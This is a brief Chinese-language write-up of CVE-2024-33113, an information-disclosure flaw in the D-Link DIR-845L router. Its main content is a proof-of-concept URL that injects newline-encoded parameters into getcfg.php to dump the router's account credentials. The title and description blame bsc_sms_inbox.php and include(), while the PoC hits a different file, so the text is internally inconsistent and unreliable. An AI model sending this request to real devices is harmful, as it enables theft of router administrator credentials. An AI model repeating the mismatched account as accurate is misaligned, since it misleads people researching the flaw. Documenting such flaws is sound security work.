## D-LINK-DIR-845L接口bsc_sms_inbox.php存在信息泄露漏洞

CVE-2024-33113 是 D-LINK DIR-845L 路由器中的一个漏洞，允许通过 bsc_sms_inbox.php 文件泄露信息。该漏洞是由于对 include() 函数处理不当而引起的，可以通过操纵 $file 变量来利用该漏洞。这使得攻击者可以包含任意 PHP 脚本并可能检索敏感信息，例如路由器的用户名和密码。

## poc

```
http://IP:8080/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406281801200.png)